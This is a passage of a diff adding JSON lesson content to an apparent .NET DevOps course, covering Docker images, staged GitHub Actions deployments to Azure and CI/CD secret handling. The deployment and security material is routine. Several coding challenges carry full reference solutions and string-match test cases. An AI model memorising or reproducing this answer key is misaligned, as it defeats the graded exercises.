restore\n\n# Source code changes won't invalidate restore cache\nCOPY . ./\nRUN dotnet build\n```\n\n```dockerfile\n# BAD: Copy everything at once\nCOPY . ./\nRUN dotnet restore  # Invalidated by any source change\nRUN dotnet build\n```\n\n## The .dockerignore File\n\nLike .gitignore, .dockerignore prevents files from being sent to the build context. This speeds up builds and prevents sensitive files from entering images:\n\n```\n# .dockerignore\n**/.git\n**/.vs\n**/bin\n**/obj\n**/node_modules\n**/*.md\n**/Dockerfile*\n**/.dockerignore\n**/docker-compose*\n**/.env*\n**/secrets*\n```\n\n## Security Best Practices\n\n**Run as non-root:** Never run containers as root in production. Create a dedicated user:\n```dockerfile\nRUN adduser -D appuser\nUSER appuser\n```\n\n**Scan for vulnerabilities:** Use Trivy, Snyk, or similar tools in your CI pipeline to detect vulnerable packages before deployment.\n\n**Generate SBOM:** Software Bill of Materials lists all components in your image, enabling vulnerability tracking when new CVEs are announced.\n\n**Use distroless or chiseled images:** These minimal images contain no shell or package manager, dramatically reducing attack surface.\n\n## Image Tagging Strategy\n\nConsistent tagging enables reliable deployments and rollbacks:\n\n- `latest` - Current main branch build (use cautiously in production)\n- `v1.2.3` - Semantic version from git tags\n- `sha-abc123` - Specific commit for exact reproducibility\n- `main` / `develop` - Branch-based for environments\n\nProduction should always deploy specific versions (v1.2.3 or sha-abc123), never `latest`. This ensures you know exactly what is running and can rollback to a specific version."
+            }
+          ],
+          "challenges": [
+            {
+              "type": "FREE_CODING",
+              "id": "lesson-24-03-challenge-01",
+              "title": "Create Optimized Dockerfile",
+              "description": "Build an optimized multi-stage Dockerfile for a .NET API application.",
+              "instructions": "Create an optimized Dockerfile for ShopFlow API!\n\n1. Use multi-stage builds with three stages:\n   - Build stage: Use SDK image to compile the application\n   - Test stage: Run unit tests before publishing\n   - Runtime stage: Use minimal ASP.NET runtime image\n\n2. Optimize for layer caching:\n   - Copy .csproj files first, then restore\n   - Copy source code after restore\n\n3. Apply security best practices:\n   - Run as non-root user in production\n   - Use Alpine-based image for smaller size\n\n4. Configure health check and expose port 8080",
+              "starterCode": "# TODO: Create a multi-stage Dockerfile for ShopFlow API\n\n# STAGE 1: Build\n# - Use mcr.microsoft.com/dotnet/sdk:9.0\n# - Copy project files and restore dependencies\n# - Copy source code and build\n# - Publish to /app/publish\n\n# STAGE 2: Test\n# - Extend from build stage\n# - Copy test project and run tests\n\n# STAGE 3: Runtime\n# - Use mcr.microsoft.com/dotnet/aspnet:9.0-alpine\n# - Create and switch to non-root user\n# - Copy from build stage\n# - Expose port and set entry point",
+              "solution": "# Multi-stage Dockerfile for ShopFlow API\n\n# ========== STAGE 1: BUILD ==========\nFROM mcr.microsoft.com/dotnet/sdk:9.0 AS build\nWORKDIR /src\n\n# Copy project files first for layer caching\nCOPY [\"src/ShopFlow.Api/ShopFlow.Api.csproj\", \"ShopFlow.Api/\"]\nCOPY [\"src/ShopFlow.Core/ShopFlow.Core.csproj\", \"ShopFlow.Core/\"]\nCOPY [\"src/ShopFlow.Infrastructure/ShopFlow.Infrastructure.csproj\", \"ShopFlow.Infrastructure/\"]\n\n# Restore dependencies (cached unless .csproj changes)\nRUN dotnet restore \"ShopFlow.Api/ShopFlow.Api.csproj\"\n\n# Copy source code\nCOPY src/ .\n\n# Build and publish\nRUN dotnet publish \"ShopFlow.Api/ShopFlow.Api.csproj\" \\\n    -c Release \\\n    -o /app/publish \\\n    /p:UseAppHost=false\n\n# ========== STAGE 2: TEST ==========\nFROM build AS test\nWORKDIR /src\n\nCOPY [\"tests/ShopFlow.Tests.Unit/ShopFlow.Tests.Unit.csproj\", \"tests/ShopFlow.Tests.Unit/\"]\nRUN dotnet restore \"tests/ShopFlow.Tests.Unit/ShopFlow.Tests.Unit.csproj\"\n\nCOPY tests/ tests/\nRUN dotnet test \"tests/ShopFlow.Tests.Unit/ShopFlow.Tests.Unit.csproj\" \\\n    -c Release --no-restore\n\n# ========== STAGE 3: RUNTIME ==========\nFROM mcr.microsoft.com/dotnet/aspnet:9.0-alpine AS runtime\n\n# Create non-root user\nRUN addgroup -S appgroup && adduser -S appuser -G appgroup\n\nWORKDIR /app\nCOPY --from=build /app/publish .\n\n# Set ownership and switch to non-root user\nRUN chown -R appuser:appgroup /app\nUSER appuser\n\n# Expose port and configure environment\nEXPOSE 8080\nENV ASPNETCORE_URLS=http://+:8080\n\n# Health check\nHEALTHCHECK --interval=30s --timeout=3s \\\n    CMD wget --quiet --tries=1 --spider http://localhost:8080/healthz/live || exit 1\n\nENTRYPOINT [\"dotnet\", \"ShopFlow.Api.dll\"]",
+              "language": "dockerfile",
+              "testCases": [
+                {
+                  "id": "test-1",
+                  "description": "Should use SDK image for build",
+                  "expectedOutput": "dotnet/sdk:9.0",
+                  "isVisible": true
+                },
+                {
+                  "id": "test-2",
+                  "description": "Should use Alpine runtime image",
+                  "expectedOutput": "aspnet:9.0-alpine",
+                  "isVisible": true
+                },
+                {
+                  "id": "test-3",
+                  "description": "Should copy csproj files before restore",
+                  "expectedOutput": ".csproj",
+                  "isVisible": true
+                },
+                {
+                  "id": "test-4",
+                  "description": "Should create non-root user",
+                  "expectedOutput": "adduser",
+                  "isVisible": true
+                },
+                {
+                  "id": "test-5",
+                  "description": "Should include health check",
+                  "expectedOutput": "HEALTHCHECK",
+                  "isVisible": true
+                },
+                {
+                  "id": "test-6",
+                  "description": "Should expose port 8080",
+                  "expectedOutput": "8080",
+                  "isVisible": true
+                }
+              ],
+              "hints": [
+                {
+                  "level": 1,
+                  "text": "Start each stage with FROM and give it a name using AS (e.g., FROM sdk:9.0 AS build)."
+                },
+                {
+                  "level": 2,
+                  "text": "Copy .csproj files first with COPY, then RUN dotnet restore, then copy the rest of the source."
+                },
+                {
+                  "level": 3,
+                  "text": "Use COPY --from=build to copy files from the build stage to the runtime stage."
+                },
+                {
+                  "level": 4,
+                  "text": "Alpine images use addgroup -S and adduser -S syntax for creating system users."
+                },
+                {
+                  "level": 5,
+                  "text": "Alpine doesn't have curl by default; use wget for health checks instead."
+                }
+              ],
+              "commonMistakes": [
+                {
+                  "mistake": "Using SDK image for runtime",
+                  "consequence": "Final image is 600MB+ larger than necessary, increasing attack surface and deployment time.",
+                  "correction": "Use mcr.microsoft.com/dotnet/aspnet image for runtime, not sdk."
+                },
+                {
+                  "mistake": "Copying all files before restore",
+                  "consequence": "Any source code change invalidates the restore cache, making builds much slower.",
+                  "correction": "Copy only .csproj files first, run restore, then copy source code."
+                },
+                {
+                  "mistake": "Running as root in production",
+                  "consequence": "Container compromise gives attacker root access to the container filesystem.",
+                  "correction": "Create a non-root user and switch with USER directive before ENTRYPOINT."
+                },
+                {
+                  "mistake": "Using curl in Alpine without installing it",
+                  "consequence": "Health check fails because curl is not available in Alpine images.",
+                  "correction": "Use wget which is available by default, or install curl with apk add."
+                }
+              ],
+              "difficulty": "intermediate"
+            }
+          ]
+        },
+        {
+          "id": "lesson-24-04",
+          "title": "Environment-Based Deployments",
+          "moduleId": "module-24",
+          "order": 4,
+          "estimatedMinutes": 40,
+          "difficulty": "intermediate",
+          "contentSections": [
+            {
+              "type": "ANALOGY",
+              "title": "Environments as Restaurant Kitchen Stations",
+              "content": "A professional restaurant kitchen operates with multiple stations, each serving a distinct purpose in the journey from raw ingredients to plates served to customers. Understanding these stations illuminates how software environments work.\n\nThe prep station (development environment) is where chefs experiment and create. They try new techniques, adjust seasoning, and occasionally make mistakes. Nothing leaves this station for customers - it is purely for learning and innovation. Failed experiments get tossed without consequence. Chefs work quickly without worrying about presentation because this food is not for service.\n\nThe quality control station (staging environment) is where dishes are evaluated before entering the menu. The executive chef tastes every dish, checks plating, and verifies it meets restaurant standards. This station uses the same equipment, ingredients, and techniques as the service line - the only difference is the audience. Problems caught here prevent embarrassment during actual service. New menu items go through multiple rounds here before being approved.\n\nThe service line (production environment) is where food goes to paying customers. Every dish must be perfect. The station has strict protocols: tickets must be confirmed, timing must be coordinated, and any deviation from standards stops the line. Chefs working this station have proven their skills through the earlier stations. Changes to production happen only after thorough validation.\n\nSoftware deployments follow this same flow. Developers work freely in development, breaking things and iterating rapidly. Staging replicates production exactly, catching issues before they affect real users. Production serves actual customers with zero tolerance for errors. Code flows from development through staging to production, gaining confidence at each step. Just as you would never serve an untested experimental dish to paying customers, you never deploy untested code directly to production."
+            },
+            {
+              "type": "EXAMPLE",
+              "title": "Environment Configuration in GitHub",
+              "content": "GitHub Environments provide deployment targets with protection rules, secrets, and approval workflows. This configuration creates development, staging, and production environments with appropriate safeguards.",
+              "code": "# ===== GitHub Repository Settings =====\n# Navigate to: Settings > Environments\n\n# Create these environments in the GitHub UI:\n\n# ========== DEVELOPMENT ENVIRONMENT ==========\n# Name: development\n# Protection rules: None (fast iteration)\n# Secrets:\n#   - AZURE_CLIENT_ID: (dev subscription)\n#   - DATABASE_URL: postgres://dev-server/shopflow_dev\n#   - REDIS_URL: redis://dev-cache:6379\n\n# ========== STAGING ENVIRONMENT ==========  \n# Name: staging\n# Protection rules:\n#   - Required reviewers: (empty - automated)\n#   - Wait timer: 0 minutes\n#   - Deployment branches: main, release/*\n# Secrets:\n#   - AZURE_CLIENT_ID: (staging subscription)\n#   - DATABASE_URL: postgres://staging-server/shopflow_staging\n#   - REDIS_URL: redis://staging-cache:6379\n\n# ========== PRODUCTION ENVIRONMENT ==========\n# Name: production  \n# Protection rules:\n#   - Required reviewers: @shopflow/platform-team\n#   - Wait timer: 15 minutes (for metrics observation)\n#   - Deployment branches: main\n#   - Custom rules: Must pass staging first\n# Secrets:\n#   - AZURE_CLIENT_ID: (production subscription)\n#   - DATABASE_URL: (stored in Key Vault, not here)\n#   - REDIS_URL: (stored in Key Vault, not here)\n\n# ===== .github/workflows/deploy.yml =====\n# Workflow using these environments\n\nname: Deploy ShopFlow\n\non:\n  push:\n    branches: [main]\n  workflow_dispatch:\n    inputs:\n      environment:\n        description: 'Target environment'\n        required: true\n        default: 'staging'\n        type: choice\n        options:\n          - development\n          - staging\n          - production\n\njobs:\n  deploy-dev:\n    name: Deploy to Development\n    runs-on: ubuntu-latest\n    if: github.event_name == 'push' || github.event.inputs.environment == 'development'\n    environment:\n      name: development\n      url: https://dev.shopflow.example.com\n    \n    steps:\n      - uses: actions/checkout@v4\n      \n      - name: Log in to Azure\n        uses: azure/login@v2\n        with:\n          client-id: ${{ secrets.AZURE_CLIENT_ID }}\n          tenant-id: ${{ secrets.AZURE_TENANT_ID }}\n          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}\n      \n      - name: Deploy to Container Apps\n        uses: azure/container-apps-deploy-action@v1\n        with:\n          containerAppName: shopflow-api-dev\n          resourceGroup: shopflow-dev-rg\n          imageToDeploy: ghcr.io/shopflow/api:${{ github.sha }}\n\n  deploy-staging:\n    name: Deploy to Staging\n    runs-on: ubuntu-latest\n    needs: deploy-dev\n    if: github.ref == 'refs/heads/main'\n    environment:\n      name: staging\n      url: https://staging.shopflow.example.com\n    \n    steps:\n      - uses: actions/checkout@v4\n      \n      - name: Log in to Azure\n        uses: azure/login@v2\n        with:\n          client-id: ${{ secrets.AZURE_CLIENT_ID }}\n          tenant-id: ${{ secrets.AZURE_TENANT_ID }}\n          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}\n      \n      - name: Deploy to Container Apps\n        uses: azure/container-apps-deploy-action@v1\n        with:\n          containerAppName: shopflow-api-staging\n          resourceGroup: shopflow-staging-rg\n          imageToDeploy: ghcr.io/shopflow/api:${{ github.sha }}\n      \n      - name: Run smoke tests\n        run: |\n          # Wait for deployment to stabilize\n          sleep 30\n          \n          # Run smoke tests against staging\n          curl -f https://staging.shopflow.example.com/healthz/ready\n          curl -f https://staging.shopflow.example.com/api/products | jq '.items | length > 0'\n\n  deploy-production:\n    name: Deploy to Production\n    runs-on: ubuntu-latest\n    needs: deploy-staging\n    if: github.ref == 'refs/heads/main'\n    environment:\n      name: production\n      url: https://shopflow.example.com\n    \n    steps:\n      - uses: actions/checkout@v4\n      \n      - name: Log in to Azure\n        uses: azure/login@v2\n        with:\n          client-id: ${{ secrets.AZURE_CLIENT_ID }}\n          tenant-id: ${{ secrets.AZURE_TENANT_ID }}\n          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}\n      \n      # Blue-green deployment with traffic shifting\n      - name: Deploy new revision\n        uses: azure/container-apps-deploy-action@v1\n        with:\n          containerAppName: shopflow-api-prod\n          resourceGroup: shopflow-prod-rg\n          imageToDeploy: ghcr.io/shopflow/api:${{ github.sha }}\n      \n      - name: Shift traffic gradually\n        run: |\n          # Start with 10% traffic to new revision\n          az containerapp ingress traffic set \\\n            --name shopflow-api-prod \\\n            --resource-group shopflow-prod-rg \\\n            --revision-weight latest=10\n          \n          # Wait and monitor\n          sleep 60\n          \n          # Increase to 50%\n          az containerapp ingress traffic set \\\n            --name shopflow-api-prod \\\n            --resource-group shopflow-prod-rg \\\n            --revision-weight latest=50\n          \n          # Wait and monitor\n          sleep 60\n          \n          # Full rollout\n          az containerapp ingress traffic set \\\n            --name shopflow-api-prod \\\n            --resource-group shopflow-prod-rg \\\n            --revision-weight latest=100",
+              "language": "yaml"
+            },
+            {
+              "type": "EXAMPLE",
+              "title": "Deploying to Multiple Environments",
+              "content": "This workflow uses a matrix strategy to deploy the same application to multiple environments with environment-specific configurations.",
+              "code": "# ===== .github/workflows/matrix-deploy.yml =====\n# Deploy to multiple environments using matrix strategy\n\nname: Multi-Environment Deployment\n\non:\n  workflow_dispatch:\n    inputs:\n      deploy_prod:\n        description: 'Include production deployment'\n        required: false\n        default: false\n        type: boolean\n\nenv:\n  REGISTRY: ghcr.io\n  IMAGE_NAME: shopflow/api\n\njobs:\n  # Build once, deploy everywhere\n  build:\n    name: Build Image\n    runs-on: ubuntu-latest\n    outputs:\n      image-tag: ${{ steps.meta.outputs.tags }}\n    \n    steps:\n      - uses: actions/checkout@v4\n      \n      - name: Build and push\n        uses: docker/build-push-action@v5\n        with:\n          push: true\n          tags: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }}\n\n  # Matrix deployment to non-production environments\n  deploy-matrix:\n    name: Deploy to ${{ matrix.environment }}\n    needs: build\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        environment: [development, staging]\n        include:\n          - environment: development\n            resource-group: shopflow-dev-rg\n            container-app: shopflow-api-dev\n            url: https://dev.shopflow.example.com\n          - environment: staging\n            resource-group: shopflow-staging-rg\n            container-app: shopflow-api-staging\n            url: https://staging.shopflow.example.com\n      fail-fast: false    # Continue other deployments if one fails\n    \n    environment:\n      name: ${{ matrix.environment }}\n      url: ${{ matrix.url }}\n    \n    steps:\n      - name: Log in to Azure\n        uses: azure/login@v2\n        with:\n          client-id: ${{ secrets.AZURE_CLIENT_ID }}\n          tenant-id: ${{ secrets.AZURE_TENANT_ID }}\n          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}\n      \n      - name: Deploy to ${{ matrix.environment }}\n        run: |\n          az containerapp update \\\n            --name ${{ matrix.container-app }} \\\n            --resource-group ${{ matrix.resource-group }} \\\n            --image ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }}\n      \n      - name: Verify deployment\n        run: |\n          for i in {1..30}; do\n            if curl -sf ${{ matrix.url }}/healthz/ready; then\n              echo \"Deployment healthy!\"\n              exit 0\n            fi\n            echo \"Waiting for deployment... ($i/30)\"\n            sleep 10\n          done\n          echo \"Deployment health check failed\"\n          exit 1\n\n  # Production deployment (separate job with approval)\n  deploy-production:\n    name: Deploy to Production\n    needs: [build, deploy-matrix]\n    runs-on: ubuntu-latest\n    if: github.event.inputs.deploy_prod == 'true'\n    environment:\n      name: production\n      url: https://shopflow.example.com\n    \n    steps:\n      - name: Log in to Azure\n        uses: azure/login@v2\n        with:\n          client-id: ${{ secrets.AZURE_CLIENT_ID }}\n          tenant-id: ${{ secrets.AZURE_TENANT_ID }}\n          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}\n      \n      - name: Create deployment record\n        run: |\n          echo \"Deploying ${{ github.sha }} to production\"\n          echo \"Triggered by: ${{ github.actor }}\"\n          echo \"Timestamp: $(date -u +%Y-%m-%dT%H:%M:%SZ)\"\n      \n      - name: Deploy with blue-green strategy\n        run: |\n          # Create new revision without traffic\n          az containerapp revision copy \\\n            --name shopflow-api-prod \\\n            --resource-group shopflow-prod-rg \\\n            --image ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }} \\\n            --revision-suffix ${{ github.sha }}\n          \n          # Gradually shift traffic\n          for pct in 10 25 50 75 100; do\n            echo \"Shifting $pct% traffic to new revision\"\n            az containerapp ingress traffic set \\\n              --name shopflow-api-prod \\\n              --resource-group shopflow-prod-rg \\\n              --revision-weight shopflow-api-prod--${{ github.sha }}=$pct\n            \n            if [ $pct -lt 100 ]; then\n              echo \"Waiting 60s before next increment...\"\n              sleep 60\n            fi\n          done\n      \n      - name: Verify production deployment\n        run: |\n          curl -sf https://shopflow.example.com/healthz/ready\n          echo \"Production deployment successful!\"",
+              "language": "yaml"
+            },
+            {
+              "type": "THEORY",
+              "title": "Deployment Strategies",
+              "content": "## Rolling Deployment\n\nRolling deployment gradually replaces old instances with new ones. If you have 10 application instances, a rolling deployment might update 2 at a time, waiting for each batch to become healthy before proceeding. This maintains capacity throughout the deployment but means both old and new versions run simultaneously during the rollout.\n\n**Advantages:**\n- Zero downtime\n- Gradual rollout limits blast radius\n- Easy rollback by stopping the rollout\n\n**Disadvantages:**\n- Version mixing during deployment (old and new instances handle requests)\n- Database schema changes must be backward compatible\n- Longer deployment time compared to blue-green\n\n**Best for:** Stateless applications with backward-compatible changes, where some version mixing is acceptable.\n\n## Blue-Green Deployment\n\nBlue-green deployment maintains two identical production environments. Blue runs the current version, green runs the new version. Traffic switches atomically from blue to green once the new version is verified. If problems arise, traffic switches back instantly.\n\n**Advantages:**\n- Instant rollback (just switch traffic back)\n- No version mixing during deployment\n- Easy to verify new version before serving traffic\n\n**Disadvantages:**\n- Requires double infrastructure (or ability to provision quickly)\n- Database migrations must work with both versions\n- Stateful applications may lose in-flight requests during switch\n\n**Best for:** Critical applications where instant rollback is essential and version mixing is unacceptable.\n\n## Canary Deployment\n\nCanary deployment routes a small percentage of traffic to the new version while monitoring for issues. If metrics look good, traffic gradually shifts until the new version handles 100%. Named after the canary in a coal mine, this strategy detects problems before they affect most users.\n\n**Advantages:**\n- Minimal user impact if problems occur\n- Real production traffic validates the deployment\n- Metrics-based decisions about proceeding\n\n**Disadvantages:**\n- Complex traffic routing configuration\n- Requires robust monitoring and alerting\n- Slower full rollout than blue-green\n\n**Best for:** High-traffic applications where you want real-world validation before full rollout.\n\n## Feature Flags\n\nFeature flags decouple deployment from release. Code ships to production but remains inactive until the flag is enabled. This enables:\n\n- Deploy anytime, release when ready\n- Gradual feature rollout to user segments\n- Instant disable without deployment\n- A/B testing and experimentation\n\n```csharp\nif (await _featureManager.IsEnabledAsync(\"NewCheckoutFlow\"))\n{\n    return View(\"CheckoutV2\");\n}\nreturn View(\"Checkout\");\n```\n\nFeature flags complement deployment strategies by controlling what features are active regardless of what code is deployed.\n\n## Choosing a Strategy\n\n| Factor | Rolling | Blue-Green | Canary |\n|--------|---------|------------|--------|\n| Rollback speed | Slow (must re-deploy) | Instant | Fast (shift traffic) |\n| Infrastructure cost | Low | High (2x) | Medium |\n| Version mixing | Yes | No | Controlled |\n| Implementation complexity | Low | Medium | High |\n| Database migration support | Requires compatibility | Requires compatibility | Requires compatibility |\n\nMost teams use rolling deployments for non-critical services and blue-green or canary for production-critical systems. Database migrations always require the most careful planning regardless of deployment strategy."
+            }
+          ],
+          "challenges": [
+            {
+              "type": "FREE_CODING",
+              "id": "lesson-24-04-challenge-01",
+              "title": "Add Staging Environment to Workflow",
+              "description": "Configure a staging environment with protection rules and deployment workflow.",
+              "instructions": "Add a staging environment to the ShopFlow deployment workflow!\n\n1. Create a staging deployment job that:\n   - Uses the 'staging' environment with protection rules\n   - Deploys after the build job succeeds\n   - Only runs on the main branch\n   - Includes a URL for the environment\n\n2. Add a smoke test step after deployment:\n   - Wait for deployment to stabilize\n   - Check health endpoint\n   - Verify API returns data\n\n3. Make production deployment depend on staging:\n   - Production should only run after staging succeeds\n   - Production should require manual approval (configured in GitHub UI)",
+              "starterCode": "# Add staging environment to this deployment workflow\n\nname: Deploy ShopFlow\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Build and push image\n        run: echo \"Image built and pushed\"\n\n  # TODO: Add staging deployment job\n  # - Use 'environment:' with name 'staging' and url\n  # - Add 'needs: build' to wait for build\n  # - Add 'if:' condition for main branch only\n  # - Include smoke tests after deployment\n\n  deploy-production:\n    runs-on: ubuntu-latest\n    # TODO: Update needs to include staging\n    environment:\n      name: production\n      url: https://shopflow.example.com\n    steps:\n      - name: Deploy to production\n        run: echo \"Deploying to production\"",
+              "solution": "# Add staging environment to this deployment workflow\n\nname: Deploy ShopFlow\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Build and push image\n        run: echo \"Image built and pushed\"\n\n  deploy-staging:\n    name: Deploy to Staging\n    runs-on: ubuntu-latest\n    needs: build\n    if: github.ref == 'refs/heads/main'\n    environment:\n      name: staging\n      url: https://staging.shopflow.example.com\n    \n    steps:\n      - uses: actions/checkout@v4\n      \n      - name: Deploy to staging\n        run: |\n          echo \"Deploying to staging environment\"\n          # In real workflow: az containerapp update ...\n      \n      - name: Wait for deployment\n        run: sleep 30\n      \n      - name: Run smoke tests\n        run: |\n          # Check health endpoint\n          curl -f https://staging.shopflow.example.com/healthz/ready || exit 1\n          echo \"Health check passed\"\n          \n          # Verify API returns data\n          PRODUCT_COUNT=$(curl -s https://staging.shopflow.example.com/api/products | jq '.items | length')\n          if [ \"$PRODUCT_COUNT\" -gt 0 ]; then\n            echo \"API returning $PRODUCT_COUNT products\"\n          else\n            echo \"API returned no products!\"\n            exit 1\n          fi\n\n  deploy-production:\n    name: Deploy to Production\n    runs-on: ubuntu-latest\n    needs: [build, deploy-staging]\n    if: github.ref == 'refs/heads/main'\n    environment:\n      name: production\n      url: https://shopflow.example.com\n    \n    steps:\n      - name: Deploy to production\n        run: echo \"Deploying to production\"",
+              "language": "yaml",
+              "testCases": [
+                {
+                  "id": "test-1",
+                  "description": "Should have staging environment",
+                  "expectedOutput": "name: staging",
+                  "isVisible": true
+                },
+                {
+                  "id": "test-2",
+                  "description": "Should depend on build job",
+                  "expectedOutput": "needs: build",
+                  "isVisible": true
+                },
+                {
+                  "id": "test-3",
+                  "description": "Should only run on main branch",
+                  "expectedOutput": "github.ref == 'refs/heads/main'",
+                  "isVisible": true
+                },
+                {
+                  "id": "test-4",
+                  "description": "Should include smoke tests",
+                  "expectedOutput": "smoke tests",
+                  "isVisible": true
+                },
+                {
+                  "id": "test-5",
+                  "description": "Production should depend on staging",
+                  "expectedOutput": "deploy-staging",
+                  "isVisible": true
+                }
+              ],
+              "hints": [
+                {
+                  "level": 1,
+                  "text": "The 'environment:' key accepts both 'name:' and 'url:' properties."
+                },
+                {
+                  "level": 2,
+                  "text": "Use 'needs: build' to make staging wait for the build job to complete."
+                },
+                {
+                  "level": 3,
+                  "text": "The condition 'if: github.ref == 'refs/heads/main'' restricts to main branch."
+                },
+                {
+                  "level": 4,
+                  "text": "Production needs should be an array: 'needs: [build, deploy-staging]'."
+                },
+                {
+                  "level": 5,
+                  "text": "Use curl -f to fail on HTTP errors and jq to parse JSON responses."
+                }
+              ],
+              "commonMistakes": [
+                {
+                  "mistake": "Not checking branch in if condition",
+                  "consequence": "Staging deploys on all branches, not just main, causing unexpected deployments.",
+                  "correction": "Add 'if: github.ref == 'refs/heads/main'' to restrict to main branch."
+                },
+                {
+                  "mistake": "Missing needs dependency on staging for production",
+                  "consequence": "Production can deploy before staging is verified, defeating the purpose of staging.",
+                  "correction": "Add 'deploy-staging' to the production job's 'needs' array."
+                },
+                {
+                  "mistake": "No smoke tests after staging deployment",
+                  "consequence": "Broken deployments proceed to production without validation.",
+                  "correction": "Add curl commands to verify health endpoints and basic API functionality."
+                },
+                {
+                  "mistake": "Using curl without -f flag",
+                  "consequence": "HTTP errors (500, 502) don't fail the workflow because curl returns success by default.",
+                  "correction": "Use 'curl -f' to fail on server errors, or check HTTP status code explicitly."
+                }
+              ],
+              "difficulty": "intermediate"
+            }
+          ]
+        },
+        {
+          "id": "lesson-24-05",
+          "title": "Secrets and Security in CI/CD",
+          "moduleId": "module-24",
+          "order": 5,
+          "estimatedMinutes": 45,
+          "difficulty": "advanced",
+          "contentSections": [
+            {
+              "type": "ANALOGY",
+              "title": "Secrets as Safety Deposit Box Keys",
+              "content": "Consider how banks protect safety deposit boxes. You never receive a copy of the master key - instead, you present identification and the bank employee uses their key combined with yours to open the box. The vault has security cameras, access logs, and multiple layers of protection. If your key is lost, you go through an identity verification process rather than simply getting a duplicate.\n\nCI/CD secrets work the same way. Your database password, API keys, and service credentials are stored in a secure vault (GitHub Secrets, Azure Key Vault, HashiCorp Vault). When your workflow needs to access a secret, it does not receive a permanent copy. Instead, it presents its identity (the workflow is running in repository X, triggered by event Y, for environment Z) and receives temporary access to use that secret for the current operation.\n\nJust like the bank, your CI/CD system maintains audit logs of every secret access. You can see which workflows used which secrets and when. If a secret is compromised, you can revoke it and issue a new one without changing your workflows - they will automatically receive the new secret on their next run.\n\nThe key insight is that secrets should never be copied or stored outside the vault. Your workflow receives a secret, uses it immediately, and forgets it. The secret never appears in logs, artifacts, or outputs. Just as you would never photocopy your safety deposit box key and leave copies around your house, you never echo secrets to console output or write them to files that persist beyond the workflow run.\n\nThis principle extends to secret rotation. Banks periodically require you to update your signature card and verify your identity. Similarly, production secrets should be rotated regularly - every 90 days is a common policy. Automated rotation means even if a secret leaks, it becomes invalid before an attacker can exploit it. The vault handles rotation automatically, and your workflows continue working with no changes required."
+            },
+            {
+              "type": "EXAMPLE",
+              "title": "Managing Secrets in GitHub Actions",
+              "content": "This example demonstrates secure secret management using repository secrets, environment secrets, and OIDC authentication for cloud providers. No long-lived credentials are stored in the repository.",
+              "code": "# ===== .github/workflows/secure-deploy.yml =====\n# Demonstrates secure secret management patterns\n\nname: Secure Deployment\n\non:\n  push:\n    branches: [main]\n\n# OIDC: Request token for cloud authentication\npermissions:\n  id-token: write    # Required for OIDC\n  contents: read\n  packages: write\n\nenv:\n  # Non-secret configuration (safe to commit)\n  AZURE_RESOURCE_GROUP: shopflow-prod-rg\n  AZURE_CONTAINER_APP: shopflow-api\n  AZURE_REGION: eastus\n\njobs:\n  deploy:\n    name: Deploy with OIDC\n    runs-on: ubuntu-latest\n    environment: production\n    \n    steps:\n      - uses: actions/checkout@v4\n      \n      # ==============================================\n      # OIDC Authentication (no stored credentials!)\n      # ==============================================\n      # Azure login using OpenID Connect - no secrets stored in GitHub!\n      # Configure: Azure AD App Registration with federated credentials\n      - name: Azure Login with OIDC\n        uses: azure/login@v2\n        with:\n          # These are identifiers, not secrets\n          client-id: ${{ secrets.AZURE_CLIENT_ID }}\n          tenant-id: ${{ secrets.AZURE_TENANT_ID }}\n          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}\n          # OIDC means no client secret needed!\n      \n      # ==============================================\n      # Repository Secrets (available to all workflows)\n      # ==============================================\n      - name: Build with registry credentials\n        run: |\n          # GITHUB_TOKEN is automatically available\n          echo ${{ secrets.GITHUB_TOKEN }} | docker login ghcr.io -u ${{ github.actor }} --password-stdin\n          \n          docker build -t ghcr.io/${{ github.repository }}:${{ github.sha }} .\n          docker push ghcr.io/${{ github.repository }}:${{ github.sha }}\n      \n      # ==============================================\n      # Environment Secrets (scoped to environment)\n      # ==============================================\n      - name: Deploy to Azure Container Apps\n        run: |\n          # DATABASE_URL is only available in 'production' environment\n          # It's automatically injected because this job uses 'environment: production'\n          \n          az containerapp update \\\n            --name ${{ env.AZURE_CONTAINER_APP }} \\\n            --resource-group ${{ env.AZURE_RESOURCE_GROUP }} \\\n            --image ghcr.io/${{ github.repository }}:${{ github.sha }} \\\n            --set-env-vars \\\n              \"ConnectionStrings__DefaultConnection=secretref:database-url\" \\\n              \"ConnectionStrings__Redis=secretref:redis-url\"\n      \n      # ==============================================\n      # Secrets from Key Vault (pulled at runtime)\n      # ==============================================\n      - name: Configure from Key Vault\n        run: |\n          # Fetch secrets from Key Vault (already authenticated via OIDC)\n          STRIPE_KEY=$(az keyvault secret show \\\n            --vault-name shopflow-prod-kv \\\n            --name stripe-api-key \\\n            --query value -o tsv)\n          \n          # Use immediately, don't store or log\n          # The secret is masked in logs automatically\n          echo \"::add-mask::$STRIPE_KEY\"\n          \n          # Update container app with secret reference\n          az containerapp secret set \\\n            --name ${{ env.AZURE_CONTAINER_APP }} \\\n            --resource-group ${{ env.AZURE_RESOURCE_GROUP }} \\\n            --secrets stripe-key=\"$STRIPE_KEY\"\n\n# ===== Separate job for secret rotation =====\n  rotate-secrets:\n    name: Rotate Secrets (scheduled)\n    runs-on: ubuntu-latest\n    if: github.event_name == 'schedule'\n    environment: production\n    \n    steps:\n      - name: Azure Login\n        uses: azure/login@v2\n        with:\n          client-id: ${{ secrets.AZURE_CLIENT_ID }}\n          tenant-id: ${{ secrets.AZURE_TENANT_ID }}\n          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}\n      \n      - name: Rotate database password\n        run: |\n          # Generate new password\n          NEW_PASSWORD=$(openssl rand -base64 32)\n          echo \"::add-mask::$NEW_PASSWORD\"\n          \n          # Update in PostgreSQL\n          az postgres flexible-server execute 